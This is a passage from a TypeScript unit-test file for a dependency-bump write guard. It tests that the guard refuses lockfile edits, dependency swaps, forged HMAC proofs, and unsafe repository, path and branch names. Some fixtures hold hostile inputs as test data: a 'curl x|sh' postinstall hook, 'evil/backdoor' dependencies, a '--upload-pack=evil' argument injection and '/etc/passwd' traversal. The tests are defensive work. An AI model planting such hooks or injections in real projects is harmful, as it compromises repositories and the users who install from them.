/**
 * `write-guard.ts` unit tests — the refusals that stand between a dependency subscription and a
 * commit in somebody else's repository (M21.5, ADR-0032 §8, PROJECT_CHARTER `scp-managed-dep`).
 *
 * RELOCATED, NOT REWRITTEN. These were built against the rival M21.5 branch's write hooks on
 * `GitProviderAdapter`. The owner's 2026-08-15 decision kept the guard layer and moved it beside its
 * one consumer, because where the HTTP happens is orthogonal to what may be written — so this file
 * moved with it, whole. What did NOT move is the composed-path section: `proposeManifestBump`
 * sequenced the three adapter hooks that no longer exist, and its property ("every refusal happens
 * before anything leaves the process") is now proven where the requests actually are, with a
 * counting client, in `repo-write.matrix.test.ts`.
 *
 * Every test here asserts the structured `RepoWriteRefusalReason`, never the message prose. That is
 * deliberate and it is what makes these mutation-proofs rather than wording pins: several refusals
 * overlap on the same input (a `go.sum` target is BOTH a lockfile and not-a-known-manifest; a
 * two-line edit is BOTH multiple-lines-changed and, usually, dependency-set-changed), so a test that
 * only asserted "it threw" would stay green with the specific control deleted. The reason code is
 * what distinguishes "the gate I am testing fired" from "some later gate caught it for me".
 */
import { createHash } from "node:crypto";
import { describe, expect, it } from "vitest";
import { coordinateRuleCandidates } from "./bump-edit.js";
import {
  RepoWriteRefusal,
  assertManifestEditProof,
  assertMessageBound,
  assertWriteBranch,
  assertWritePath,
  assertWriteRepo,
  basenameOf,
  isLockfileName,
  isRepoWriteRefusal,
  locateVersionLine,
  manifestParserFor,
  verifyManifestOnlyEdit,
  type ManifestEditProof,
  type RepoWriteRefusalReason
} from "./write-guard.js";

/** Runs `fn` and returns the `RepoWriteRefusal` it threw, failing the test if it threw anything
 *  else — or nothing. Returning the error (rather than asserting inside) lets each test name the
 *  exact reason it is pinning. */
function refusalFrom(fn: () => unknown): RepoWriteRefusal {
  let caught: unknown;
  try {
    fn();
  } catch (err) {
    caught = err;
  }
  if (caught === undefined) {
    throw new Error("expected a RepoWriteRefusal, but nothing was thrown");
  }
  if (!isRepoWriteRefusal(caught)) {
    throw new Error(
      `expected a RepoWriteRefusal, got ${caught instanceof Error ? caught.message : String(caught)}`
    );
  }
  return caught;
}

function expectRefusal(fn: () => unknown, reason: RepoWriteRefusalReason): RepoWriteRefusal {
  const refusal = refusalFrom(fn);
  expect(refusal.reason).toBe(reason);
  return refusal;
}

const GO_MOD_BASE = [
  "module github.com/acme/widgets",
  "",
  "go 1.22",
  "",
  "require (",
  "\tgithub.com/Masterminds/semver/v3 v3.2.1",
  "\tgithub.com/spf13/cobra v1.8.0",
  ")",
  ""
].join("\n");

/** The same file with ONLY semver's patch digit changed. */
const GO_MOD_BUMPED = GO_MOD_BASE.replace("v3.2.1", "v3.2.4");

const GO_MOD_DECLARED = ["go.mod"];

/**
 * The DESTINATION every fixture below is verified for. It is a shared constant rather than a per-test
 * literal because `repo` and `headBranch` are now bound INTO the proof (a proof states that specific
 * bytes may be written to a specific file on a specific branch of a specific repository), and the
 * tests here are about the CONTENT gates — the destination binding gets its own block at the bottom.
 */
const FIXTURE_DESTINATION = { repo: "acme/widgets", headBranch: "scp/dep-bump/c1" } as const;

/** `verifyManifestOnlyEdit` with this file's fixture destination filled in. Overridable, because the
 *  destination-binding tests need to vary it. */
function verifyEdit(
  input: Omit<Parameters<typeof verifyManifestOnlyEdit>[0], "repo" | "headBranch"> &
    Partial<Pick<Parameters<typeof verifyManifestOnlyEdit>[0], "repo" | "headBranch">>
): ManifestEditProof {
  return verifyManifestOnlyEdit({ ...FIXTURE_DESTINATION, ...input });
}

function goBumpInput(
  overrides: Partial<Parameters<typeof verifyManifestOnlyEdit>[0]> = {}
): Omit<Parameters<typeof verifyManifestOnlyEdit>[0], "repo" | "headBranch"> {
  return {
    path: "go.mod",
    declaredManifestPaths: GO_MOD_DECLARED,
    ecosystem: "go" as const,
    baseContent: GO_MOD_BASE,
    newContent: GO_MOD_BUMPED,
    coordinate: "github.com/Masterminds/semver/v3",
    ...overrides
  };
}

// -------------------------------------------------------------------------------------------
// The happy path first — every refusal below is only meaningful against a case that is ALLOWED.
// A suite of refusals with no negative control cannot tell "correctly strict" from "refuses
// everything", which is the vacuous-test shape.
// -------------------------------------------------------------------------------------------

describe("verifyManifestOnlyEdit — the negative control", () => {
  it("ACCEPTS a single declared-version change and reports exactly what moved", () => {
    const proof = verifyEdit(goBumpInput());
    expect(proof.path).toBe("go.mod");
    expect(proof.ecosystem).toBe("go");
    expect(proof.coordinate).toBe("github.com/Masterminds/semver/v3");
    expect(proof.fromDeclared).toBe("v3.2.1");
    expect(proof.toDeclared).toBe("v3.2.4");
    expect(proof.signature).toMatch(/^[0-9a-f]{64}$/);
  });

  /**
   * A real bump in EVERY ecosystem M21 parses, because the gates are shared but the manifests are
   * not: `package.json` reports no `line` at all, `pom.xml` reports the line of the `<dependency>`
   * OPEN TAG (several lines above the version it carries), and `Dockerfile` splits one literal
   * `name:tag@digest` into two parsed fields. A gate tuned to one of those shapes and wrong for
   * another would refuse a legitimate bump for a whole language — which is why the accept side is
   * enumerated per ecosystem rather than sampled once.
   */
  it.each([
    [
      "npm / package.json",
      "npm" as const,
      "services/api/package.json",
      JSON.stringify({ name: "app", dependencies: { react: "^18.2.0" } }, null, 2),
      "^18.2.0",
      "^18.3.0",
      "react"
    ],
    [
      "python / requirements.txt",
      "python" as const,
      "requirements.txt",
      "requests==2.31.0\nurllib3==2.0.7\n",
      // The python parsers keep the OPERATOR in `declared` (`==2.31.0`, not `2.31.0`) — the
      // declared/pinned distinction is part of the statement, so the version text a bump may move
      // includes it.
      "==2.31.0",
      "==2.32.0",
      "requests"
    ],
    [
      "python / pyproject.toml",
      "python" as const,
      "pyproject.toml",
      '[project]\nname = "app"\ndependencies = ["requests==2.31.0"]\n',
      "==2.31.0",
      "==2.32.0",
      "requests"
    ],
    [
      "maven / pom.xml",
      "maven" as const,
      "pom.xml",
      [
        "<project>",
        "  <dependencies>",
        "    <dependency>",
        "      <groupId>org.springframework</groupId>",
        "      <artifactId>spring-core</artifactId>",
        "      <version>6.1.2</version>",
        "    </dependency>",
        "  </dependencies>",
        "</project>",
        ""
      ].join("\n"),
      "6.1.2",
      "6.1.3",
      "org.springframework:spring-core"
    ],
    [
      "oci / Dockerfile",
      "oci" as const,
      "Dockerfile",
      "FROM alpine:3.19\nRUN true\n",
      "3.19",
      "3.20",
      "alpine"
    ]
  ])("ACCEPTS a real bump — %s", (_label, ecosystem, path, base, from, to, coordinate) => {
    const proof = verifyEdit({
      path,
      declaredManifestPaths: [path],
      ecosystem,
      baseContent: base,
      newContent: base.replace(from, to),
      coordinate
    });
    expect(proof.fromDeclared).toBe(from);
    expect(proof.toDeclared).toBe(to);
    expect(proof.coordinate).toBe(coordinate);
  });
});

describe("path gates", () => {
  it("basenameOf takes the last segment", () => {
    expect(basenameOf("a/b/go.mod")).toBe("go.mod");
    expect(basenameOf("go.mod")).toBe("go.mod");
  });

  it("REFUSES a lockfile as a lockfile — not merely as an unknown manifest", () => {
    // The reason matters: `go.sum` also fails the manifest allowlist, so deleting the lockfile
    // check would leave this input still refused. Only the reason code distinguishes them.
    expect(() => manifestParserFor("go", "go.sum")).toThrow(RepoWriteRefusal);
    expectRefusal(() => manifestParserFor("go", "go.sum"), "lockfile");
    expectRefusal(() => manifestParserFor("npm", "package-lock.json"), "lockfile");
    expectRefusal(() => manifestParserFor("npm", "pnpm-lock.yaml"), "lockfile");
    expectRefusal(() => manifestParserFor("python", "poetry.lock"), "lockfile");
    expectRefusal(() => manifestParserFor("maven", "gradle.lockfile"), "lockfile");
  });

  it("refuses a lockfile shape nobody enumerated, by structure", () => {
    expect(isLockfileName("something-lock.yaml")).toBe(true);
    expect(isLockfileName("vendor.lock")).toBe(true);
    expect(isLockfileName("packages.lock.json")).toBe(true);
    expect(isLockfileName("go.mod")).toBe(false);
    expect(isLockfileName("package.json")).toBe(false);
    expect(isLockfileName("pyproject.toml")).toBe(false);
  });

  it("REFUSES a path that is not a manifest for its ecosystem", () => {
    expectRefusal(
      () => manifestParserFor("npm", ".github/workflows/ci.yml"),
      "not_a_known_manifest"
    );
    expectRefusal(() => manifestParserFor("npm", "Makefile"), "not_a_known_manifest");
    // ...and refuses the RIGHT manifest under the WRONG ecosystem, so the pair is the key.
    expectRefusal(() => manifestParserFor("npm", "go.mod"), "not_a_known_manifest");
    expectRefusal(() => manifestParserFor("go", "package.json"), "not_a_known_manifest");
  });

  it("accepts every spelling each ecosystem is actually edited through", () => {
    for (const [ecosystem, path] of [
      ["npm", "package.json"],
      ["go", "go.mod"],
      ["maven", "pom.xml"],
      ["python", "pyproject.toml"],
      ["python", "requirements.txt"],
      ["python", "requirements-dev.txt"],
      ["oci", "Dockerfile"],
      ["oci", "Containerfile"],
      ["oci", "Dockerfile.prod"],
      ["oci", "api.Dockerfile"]
    ] as const) {
      expect(() => manifestParserFor(ecosystem, path), `${ecosystem} ${path}`).not.toThrow();
    }
  });

  it("REFUSES a manifest the component's own inventory does not declare", () => {
    expectRefusal(
      () => verifyEdit(goBumpInput({ declaredManifestPaths: ["services/api/go.mod"] })),
      "not_declared_by_component"
    );
    // An empty declared set refuses everything — absence is never permission.
    expectRefusal(
      () => verifyEdit(goBumpInput({ declaredManifestPaths: [] })),
      "not_declared_by_component"
    );
  });
});

describe("content gates", () => {
  it("REFUSES a no-op edit", () => {
    expectRefusal(() => verifyEdit(goBumpInput({ newContent: GO_MOD_BASE })), "content_unchanged");
  });

  it("REFUSES content carrying a NUL byte", () => {
    expectRefusal(
      () => verifyEdit(goBumpInput({ newContent: `${GO_MOD_BUMPED}\u0000` })),
      "content_not_text"
    );
  });

  it("REFUSES content over the shared byte ceiling", () => {
    expectRefusal(
      () =>
        verifyEdit(
          goBumpInput({ newContent: `${GO_MOD_BUMPED}\n// ${"x".repeat(5 * 1024 * 1024)}` })
        ),
      "content_too_large"
    );
  });

  it("REFUSES an edit that changes more than one line", () => {
    const twoLines = GO_MOD_BUMPED.replace("v1.8.0", "v1.8.1");
    expectRefusal(
      () => verifyEdit(goBumpInput({ newContent: twoLines })),
      "multiple_lines_changed"
    );
  });

  it("REFUSES an edit that adds or removes a line, even a blank one", () => {
    expectRefusal(
      () => verifyEdit(goBumpInput({ newContent: `${GO_MOD_BUMPED}\n` })),
      "multiple_lines_changed"
    );
  });

  it("REFUSES an unparseable side rather than reading it as 'declares nothing'", () => {
    expectRefusal(
      () =>
        verifyEdit(
          goBumpInput({ baseContent: "<html>404</html>", newContent: "<html>405</html>" })
        ),
      "unparseable_base"
    );
    expectRefusal(
      () =>
        verifyEdit({
          path: "package.json",
          declaredManifestPaths: ["package.json"],
          ecosystem: "npm",
          baseContent: '{"dependencies":{"react":"^18.2.0"}}',
          newContent: '{"dependencies":{"react":"^18.3.0"',
          coordinate: "react"
        }),
      "unparseable_edit"
    );
  });
});

describe("the dependency SET may not change — the charter's 'never adds or removes a dependency'", () => {
  it("REFUSES an added dependency", () => {
    const withExtra = GO_MOD_BASE.replace(
      "\tgithub.com/spf13/cobra v1.8.0",
      "\tgithub.com/spf13/cobra v1.8.0\n\tgithub.com/pkg/errors v0.9.1"
    );
    // Line count changes too — so this is pinned by the reason, which says which gate fired.
    expectRefusal(
      () => verifyEdit(goBumpInput({ newContent: withExtra })),
      "multiple_lines_changed"
    );
  });

  it("REFUSES a swap of one dependency for another on the SAME line — identical line count, identical dependency count", () => {
    // This is the case the line gate cannot see and the set gate must: one line, one declaration,
    // a different package. Deleting the identity comparison in gate 5 makes this test fail.
    const swapped = GO_MOD_BASE.replace(
      "\tgithub.com/spf13/cobra v1.8.0",
      "\tgithub.com/evil/backdoor v1.8.0"
    );
    expectRefusal(() => verifyEdit(goBumpInput({ newContent: swapped })), "dependency_set_changed");
  });

  it("REFUSES a re-scope (runtime -> dev) even when the version is untouched", () => {
    const base = JSON.stringify({ dependencies: { react: "^18.2.0" } }, null, 2);
    const moved = JSON.stringify({ devDependencies: { react: "^18.2.0" } }, null, 2);
    expectRefusal(
      () =>
        verifyEdit({
          path: "package.json",
          declaredManifestPaths: ["package.json"],
          ecosystem: "npm",
          baseContent: base,
          newContent: moved,
          coordinate: "react"
        }),
      "dependency_set_changed"
    );
  });
});

describe("exactly ONE already-declared version may move", () => {
  it("REFUSES a one-line edit that moves no version at all", () => {
    const base = ["FROM alpine:3.19", 'LABEL org.opencontainers.image.title="app"', ""].join("\n");
    const edited = base.replace('title="app"', 'title="app2"');
    expectRefusal(
      () =>
        verifyEdit({
          path: "Dockerfile",
          declaredManifestPaths: ["Dockerfile"],
          ecosystem: "oci",
          baseContent: base,
          newContent: edited,
          coordinate: "alpine"
        }),
      "no_version_changed"
    );
  });

  it("REFUSES a bump of a coordinate this subscription is not for", () => {
    expectRefusal(
      () => verifyEdit(goBumpInput({ coordinate: "github.com/spf13/cobra" })),
      "coordinate_not_expected"
    );
  });

  it("REFUSES a constraint-kind change — a range rewritten as a pin is not a bump", () => {
    const base = "requests>=2.0\nurllib3==2.0.7\n";
    const pinned = "requests==2.31.0\nurllib3==2.0.7\n";
    expectRefusal(
      () =>
        verifyEdit({
          path: "requirements.txt",
          declaredManifestPaths: ["requirements.txt"],
          ecosystem: "python",
          baseContent: base,
          newContent: pinned,
          coordinate: "requests"
        }),
      "constraint_kind_changed"
    );
  });

  it("REFUSES adding a version where the author declared none (unpinned -> pinned)", () => {
    const base = "FROM alpine\n";
    const pinned = "FROM alpine:3.19\n";
    // `unpinned` -> `pinned` is a constraint-kind change, and that is the gate that catches it —
    // asserted by reason so this cannot be mistaken for the coordinate check firing.
    expectRefusal(
      () =>
        verifyEdit({
          path: "Dockerfile",
          declaredManifestPaths: ["Dockerfile"],
          ecosystem: "oci",
          baseContent: base,
          newContent: pinned,
          coordinate: "alpine"
        }),
      "constraint_kind_changed"
    );
  });

  it("REFUSES a manifest that does not declare the subscribed coordinate at all", () => {
    // Distinct from the case above, and the reason codes are what keep them distinct: there the
    // subscribed coordinate IS declared and something else moved (`coordinate_not_expected`); here
    // the subscribed coordinate is absent from the manifest entirely, so there is nothing to bump.
    // Both must be reachable — an ordering that made either unreachable would be dead code
    // masquerading as a control.
    expectRefusal(
      () => verifyEdit(goBumpInput({ coordinate: "github.com/not/declared" })),
      "coordinate_not_declared"
    );
  });
});

describe("the change must be confined to the version text", () => {
  it("REFUSES a version bump smuggled onto the same line as other content", () => {
    // The whole attack the line gate cannot see: ONE line, ONE declaration, one version moved —
    // and an install hook added beside it. Only the confinement gate refuses this.
    const base = '{"dependencies":{"react":"^18.2.0"}}';
    const edited = '{"scripts":{"postinstall":"curl x|sh"},"dependencies":{"react":"^18.3.0"}}';
    expectRefusal(
      () =>
        verifyEdit({
          path: "package.json",
          declaredManifestPaths: ["package.json"],
          ecosystem: "npm",
          baseContent: base,
          newContent: edited,
          coordinate: "react"
        }),
      "edit_outside_version_text"
    );
  });

  it("ACCEPTS an image bump that moves the tag AND its digest together — one literal, two parsed fields", () => {
    const base = "FROM ghcr.io/acme/base:1.2.3@sha256:" + "a".repeat(64) + "\n";
    const edited = "FROM ghcr.io/acme/base:1.2.4@sha256:" + "b".repeat(64) + "\n";
    const proof = verifyEdit({
      path: "Dockerfile",
      declaredManifestPaths: ["Dockerfile"],
      ecosystem: "oci",
      baseContent: base,
      newContent: edited,
      coordinate: "ghcr.io/acme/base"
    });
    expect(proof.fromDeclared).toBe("1.2.3");
    expect(proof.toDeclared).toBe("1.2.4");
  });
});

/**
 * ADR-0032 §8i — THE EDIT THAT IS STRUCTURALLY PERFECT AND OPERATIONALLY A NO-OP.
 *
 * Every other refusal in this file is about an edit that would change TOO MUCH. This one is about
 * an edit that changes nothing that runs: where a declaration is pinned by a tag AND a digest, the
 * runtime resolves by the digest, so moving the tag alone leaves the deployed bytes exactly where
 * they were. Nothing errors, every gate above agrees, the pull request merges, and the image never
 * moves — which is worse than a refusal, because a refusal is legible.
 *
 * The condition is "the digest did not move", never "a digest exists": the accept case directly
 * above moves both and must stay green, and it is what keeps this from being a rule that refuses
 * every digest-bearing manifest.
 */
describe("a tag that moves while its digest stays", () => {
  const DIGEST_A = `sha256:${"a".repeat(64)}`;

  it("REFUSES a Dockerfile bump that moves the tag and leaves the digest pinning the old bytes", () => {
    expectRefusal(
      () =>
        verifyEdit({
          path: "Dockerfile",
          declaredManifestPaths: ["Dockerfile"],
          ecosystem: "oci",
          baseContent: `FROM ghcr.io/acme/base:1.2.3@${DIGEST_A}\n`,
          newContent: `FROM ghcr.io/acme/base:1.2.4@${DIGEST_A}\n`,
          coordinate: "ghcr.io/acme/base"
        }),
      "digest_pin_not_moved"
    );
  });

  it("REFUSES the SPLIT shape too — the values file where the digest is a line of its own", () => {
    // This is the shape M21.7 made writable, and the one that made the defect reachable through the
    // anchored branch: the runner edits the `tag:` line, the `digest:` line below it is untouched,
    // and both verifiers see one clean single-line version change.
    const base = ["image:", "  repository: acme/api", "  tag: 1.2.3", `  digest: ${DIGEST_A}`, ""];
    expectRefusal(
      () =>
        verifyEdit({
          path: "values.yaml",
          declaredManifestPaths: ["values.yaml"],
          ecosystem: "oci",
          baseContent: base.join("\n"),
          newContent: base.join("\n").replace("tag: 1.2.3", "tag: 1.2.4"),
          coordinate: "acme/api"
        }),
      "digest_pin_not_moved"
    );
  });

  it("NEGATIVE CONTROL: the identical split shape with NO digest line is ACCEPTED", () => {
    // Without this, the two refusals above are satisfied by a gate that refuses every values bump —
    // which is the whole capability the split-shape round added.
    const base = ["image:", "  repository: acme/api", "  tag: 1.2.3", ""].join("\n");
    const proof = verifyEdit({
      path: "values.yaml",
      declaredManifestPaths: ["values.yaml"],
      ecosystem: "oci",
      baseContent: base,
      newContent: base.replace("tag: 1.2.3", "tag: 1.2.4"),
      coordinate: "acme/api"
    });
    expect(proof.fromDeclared).toBe("1.2.3");
    expect(proof.toDeclared).toBe("1.2.4");
  });
});

// -------------------------------------------------------------------------------------------
// The proof is a control, not a label
// -------------------------------------------------------------------------------------------

describe("ManifestEditProof", () => {
  it("accepts the content it was minted for", () => {
    const proof = verifyEdit(goBumpInput());
    expect(() =>
      assertManifestEditProof("testprovider", {
        ...FIXTURE_DESTINATION,
        path: "go.mod",
        content: GO_MOD_BUMPED,
        proof
      })
    ).not.toThrow();
  });

  it("REFUSES content mutated after verification — the proof binds to bytes, it does not travel with them", () => {
    const proof = verifyEdit(goBumpInput());
    expectRefusal(
      () =>
        assertManifestEditProof("testprovider", {
          ...FIXTURE_DESTINATION,
          path: "go.mod",
          content: `${GO_MOD_BUMPED}\nrequire github.com/evil/backdoor v1.0.0`,
          proof
        }),
      "proof_mismatch"
    );
  });

  it("REFUSES a proof minted for a different path", () => {
    const proof = verifyEdit(goBumpInput());
    expectRefusal(
      () =>
        assertManifestEditProof("testprovider", {
          ...FIXTURE_DESTINATION,
          path: "services/api/go.mod",
          content: GO_MOD_BUMPED,
          proof
        }),
      "proof_mismatch"
    );
  });

  it("REFUSES a hand-built proof — one that never passed verifyManifestOnlyEdit", () => {
    // The forgery an attacker (or a careless future caller) would actually attempt: a
    // structurally perfect proof over content that was never checked. The HMAC is what refuses it,
    // and this test fails the moment the signature check is dropped from assertManifestEditProof.
    const evil = "module x\n\nrequire github.com/evil/backdoor v1.0.0\n";
    const forged: ManifestEditProof = {
      ...FIXTURE_DESTINATION,
      path: "go.mod",
      ecosystem: "go",
      coordinate: "github.com/evil/backdoor",
      fromDeclared: "v0.9.0",
      toDeclared: "v1.0.0",
      // The correct hash of the evil content — so ONLY the signature can refuse this.
      contentSha256: createHash("sha256").update(evil, "utf8").digest("hex"),
      signature: "0".repeat(64)
    };
    expectRefusal(
      () =>
        assertManifestEditProof("testprovider", {
          ...FIXTURE_DESTINATION,
          path: "go.mod",
          content: evil,
          proof: forged
        }),
      "proof_mismatch"
    );
  });
});

/**
 * ================================================================================================
 * THE PROOF BINDS THE DESTINATION, NOT JUST THE CONTENT
 * ================================================================================================
 * The stated guarantee is "content that did not pass verification cannot reach a repository". Bound
 * to path + content alone, it was one field short of that: a proof minted for `acme/widgets`'s bump
 * branch verified cleanly against a publish of the same bytes at the same path to a DIFFERENT
 * repository, or to the BASE branch — the two destinations that matter, since one is somebody else's
 * repo and the other is the branch the pull request was supposed to target.
 */
describe("the proof binds WHERE the bytes may be written", () => {
  it("names the repository and the branch it was minted for", () => {
    const proof = verifyEdit(goBumpInput());
    expect(proof.repo).toBe(FIXTURE_DESTINATION.repo);
    expect(proof.headBranch).toBe(FIXTURE_DESTINATION.headBranch);
  });

  it("REFUSES a write to a different repository, with the same bytes at the same path", () => {
    const proof = verifyEdit(goBumpInput());
    expectRefusal(
      () =>
        assertManifestEditProof("testprovider", {
          ...FIXTURE_DESTINATION,
          repo: "acme/other-team-repo",
          path: "go.mod",
          content: GO_MOD_BUMPED,
          proof
        }),
      "proof_mismatch"
    );
  });

  it("REFUSES a write to a different branch — including the base branch the PR targets", () => {
    const proof = verifyEdit(goBumpInput());
    expectRefusal(
      () =>
        assertManifestEditProof("testprovider", {
          ...FIXTURE_DESTINATION,
          headBranch: "main",
          path: "go.mod",
          content: GO_MOD_BUMPED,
          proof
        }),
      "proof_mismatch"
    );
  });

  it("REFUSES a proof whose destination fields were rewritten after minting — the HMAC covers them", () => {
    // Not the same test as the two above: those change the WRITE's destination, this changes the
    // PROOF's. If `repo`/`headBranch` were compared but not signed, an attacker holding a valid
    // proof could simply restate them and the equality checks would pass.
    const proof = verifyEdit(goBumpInput());
    const reaimed: ManifestEditProof = {
      ...proof,
      repo: "acme/other-team-repo",
      headBranch: "main"
    };
    expectRefusal(
      () =>
        assertManifestEditProof("testprovider", {
          repo: "acme/other-team-repo",
          headBranch: "main",
          path: "go.mod",
          content: GO_MOD_BUMPED,
          proof: reaimed
        }),
      "proof_mismatch"
    );
  });
});

/**
 * ================================================================================================
 * THE REFUSAL REASONS THAT HAD NO TEST
 * ================================================================================================
 * `RepoWriteRefusalReason`'s own doc says each reason is "stated as its own reason with its own test
 * rather than folded into a generic 'invalid request'". A census of the enum against the suites found
 * three with no assertion anywhere: `multiple_versions_changed`, `unbumpable_constraint` and
 * `message_too_large`. A reason nothing asserts is indistinguishable from a branch that cannot fire,
 * which is the difference between a control and a comment — so the doc is now true rather than
 * narrowed.
 */
describe("the three reasons that had no test", () => {
  it("REFUSES an edit that moves TWO declared versions on one line", () => {
    // Must be ONE line, or gate 3 (`multiple_lines_changed`) catches it first and this reason stays
    // unreachable. A minified package.json is exactly that shape.
    const base = '{"dependencies":{"react":"^18.2.0","redux":"^4.0.0"}}';
    const edited = '{"dependencies":{"react":"^18.3.0","redux":"^4.1.0"}}';
    expectRefusal(
      () =>
        verifyEdit({
          path: "package.json",
          declaredManifestPaths: ["package.json"],
          ecosystem: "npm",
          baseContent: base,
          newContent: edited,
          coordinate: "react"
        }),
      "multiple_versions_changed"
    );
  });

  it("REFUSES bumping a declaration whose version this package refuses to resolve", () => {
    // A `git+https://` npm specifier NAMES A LOCATION, not a registry version line, so its
    // constraint is `unresolved` on BOTH sides — the ref inside it moved, which makes it the one
    // changed declaration, and there is still no declared VERSION to bump. Reaching this reason
    // needs exactly that shape: the subscribed coordinate must be the one that CHANGED (or
    // `coordinate_not_expected` fires first) and its constraint KIND must be unchanged (or
    // `constraint_kind_changed` does). That narrowness is why it had no test.
    const base = '{"dependencies":{"@acme/lib":"git+https://github.com/acme/lib#v1.2.3"}}';
    const edited = '{"dependencies":{"@acme/lib":"git+https://github.com/acme/lib#v1.2.4"}}';
    expectRefusal(
      () =>
        verifyEdit({
          path: "package.json",
          declaredManifestPaths: ["package.json"],
          ecosystem: "npm",
          baseContent: base,
          newContent: edited,
          coordinate: "@acme/lib"
        }),
      "unbumpable_constraint"
    );
  });

  it("REFUSES a commit message / PR title / PR body over its bound", () => {
    // The prose SCP writes is DERIVED from the descriptor, never passed in — but derived is not
    // bounded: it is composed from a coordinate and two version tokens, all tenant-controlled. This
    // is the gate that says so, and it had no test at all.
    expectRefusal(
      () => assertMessageBound("x".repeat(100_000), 72, "pull-request title"),
      "message_too_large"
    );
    // …and the negative control, so this cannot pass by the bound refusing everything.
    expect(() => assertMessageBound("chore(deps): bump", 72, "pull-request title")).not.toThrow();
  });
});

// -------------------------------------------------------------------------------------------
// URL safety on the write path — the read path's asserts, reused
// -------------------------------------------------------------------------------------------

describe("write-path URL safety inherits the read path's asserts", () => {
  it("REFUSES a traversal repo, path and base ref", () => {
    expectRefusal(() => assertWriteRepo("p", "acme/widgets/../../.."), "unsafe_repo");
    expectRefusal(() => assertWriteRepo("p", "acme/widgets?x="), "unsafe_repo");
    expectRefusal(() => assertWritePath("p", "../../user"), "unsafe_path");
    expectRefusal(() => assertWritePath("p", "/etc/passwd"), "unsafe_path");
  });

  it("REFUSES a branch name that is not a plain branch name", () => {
    expectRefusal(() => assertWriteBranch("p", "../../../../user"), "unsafe_branch");
    expectRefusal(() => assertWriteBranch("p", "refs/heads/x"), "unsafe_branch");
    expectRefusal(() => assertWriteBranch("p", "HEAD"), "unsafe_branch");
    expectRefusal(() => assertWriteBranch("p", "--upload-pack=evil"), "unsafe_branch");
    expectRefusal(() => assertWriteBranch("p", "a b"), "unsafe_branch");
  });

  it("accepts the branch names a bump actually uses", () => {
    for (const branch of ["scp/bump-semver-3.2.4", "scp-dep/go/semver", "main"]) {
      expect(() => assertWriteBranch("p", branch), branch).not.toThrow();
    }
  });
});

// -------------------------------------------------------------------------------------------
// M21.7 — `locateVersionLine`, the anchor derivation, and the gate that catches a wrong SELECTION
// -------------------------------------------------------------------------------------------

/** The adversarial values file of `split-shape-image-bumps.md` §7, byte-identical to the one
 *  `bump-edit.test.ts` uses — the derivation and the refusal must agree about which line is line 7. */
const VALUES = [
  "# charts/api/values.yaml",
  "global:",
  "  imageTag: 1.2.3",
  "api:",
  "  image:",
  "    repository: acme/api",
  "    tag: 1.2.3",
  "worker:",
  "  image:",
  "    repository: acme/worker",
  "    tag: 1.2.3",
  "appVersion: 1.2.3",
  "podLabels:",
  '  version: "1.2.3"',
  ""
].join("\n");

const VALUES_SPEC = {
  ecosystem: "oci" as const,
  manifestPath: "chart/values.yaml",
  coordinate: "acme/api",
  fromVersion: "1.2.3"
};

describe("locateVersionLine — the anchor exists exactly where it is honest", () => {
  it("finds the VERSION line of a split-shape image, not the repository line beside it", () => {
    // The whole point. `acme/api` is on line 6 and the version it declares is on line 7, and the
    // edit target is the second of those.
    expect(locateVersionLine(VALUES, VALUES_SPEC)).toEqual({ line: 7, text: "    tag: 1.2.3" });
  });

  it("distinguishes two images whose tags are identical", () => {
    // `worker.image.tag` (line 11) is byte-identical to line 7 and carries the same version. If the
    // filter were on the version alone, or on the line text, this would be ambiguous.
    expect(locateVersionLine(VALUES, { ...VALUES_SPEC, coordinate: "acme/worker" })).toEqual({
      line: 11,
      text: "    tag: 1.2.3"
    });
  });

  it("SHAPE C: anchors a coordinate that appears nowhere contiguously in the file", () => {
    const content = "image:\n  registry: ghcr.io\n  repository: acme/api\n  tag: 1.2.3\n";
    expect(content.includes("ghcr.io/acme/api")).toBe(false);
    expect(locateVersionLine(content, { ...VALUES_SPEC, coordinate: "ghcr.io/acme/api" })).toEqual({
      line: 4,
      text: "  tag: 1.2.3"
    });
  });

  it("MAVEN YIELDS NO ANCHOR — the four working ecosystems are untouched BY CONSTRUCTION", () => {
    // This is the mutation-sensitive proof that step 4 is doing the work. `pom-xml.ts` records the
    // line of the `<dependency>` OPEN TAG, and that line does not carry the version — so the "the
    // parser's line must contain fromVersion" clause declines, and Maven's path cannot change. Delete
    // that clause and this test goes red while every other test in the suite stays green.
    const pom = [
      "<project>",
      "  <dependencies>",
      "    <dependency>",
      "      <groupId>com.acme</groupId>",
      "      <artifactId>lib</artifactId>",
      "      <version>1.2.3</version>",
      "    </dependency>",
      "  </dependencies>",
      "</project>",
      ""
    ].join("\n");
    // The declaration IS parsed, and it IS the one the descriptor names — so this is not "the parser
    // found nothing", it is step 4 refusing an anchor the parse would otherwise have supplied.
    expect(
      manifestParserFor(
        "maven",
        "pom.xml"
      )(pom).map((d) => ({
        coordinate: d.coordinate,
        declared: d.declared,
        line: d.line
      }))
    ).toContainEqual({ coordinate: "com.acme:lib", declared: "1.2.3", line: 3 });
    expect(
      locateVersionLine(pom, {
        ecosystem: "maven",
        manifestPath: "pom.xml",
        coordinate: "com.acme:lib",
        fromVersion: "1.2.3"
      })
    ).toBeUndefined();
  });

  it("DOES anchor the ecosystems that already worked, so the veto is exercised and not dead code", () => {
    // D5: derive the anchor wherever step 4 admits one. For a Dockerfile the coordinate and the
    // version ARE on one line, so the coordinate rule speaks and the anchor must agree with it —
    // which is only a real cross-check if an anchor is produced here at all.
    expect(
      locateVersionLine("FROM alpine:3.18\nRUN true\n", {
        ecosystem: "oci",
        manifestPath: "Dockerfile",
        coordinate: "alpine",
        fromVersion: "3.18"
      })
    ).toEqual({ line: 1, text: "FROM alpine:3.18" });
  });

  /**
   * THE PER-ECOSYSTEM MAP, AS A FACT RATHER THAN AS PROSE.
   *
   * `bump-edit.ts` and `index.ts` both carried "…which keeps the four working ecosystems untouched
   * BY CONSTRUCTION", and it was false of three of them: `go`, `requirements*.txt` and Dockerfile
   * all take the anchored branch. The claim was in a comment, so nothing could contradict it — and
   * this milestone has already paid twice for a comment asserting a property the code lacks.
   *
   * Enumerated here so the map is CHECKED. It goes red if a parser starts or stops reporting the
   * line its version is written on, which is exactly the change that would silently move an
   * ecosystem from one column to the other.
   */
  it.each([
    [
      "go — anchors: the require line carries the version",
      "go" as const,
      "go.mod",
      "module acme/web\n\nrequire (\n\tgithub.com/acme/lib v1.2.3\n)\n",
      "github.com/acme/lib",
      "v1.2.3",
      4
    ],
    [
      "python/requirements.txt — anchors",
      "python" as const,
      "requirements.txt",
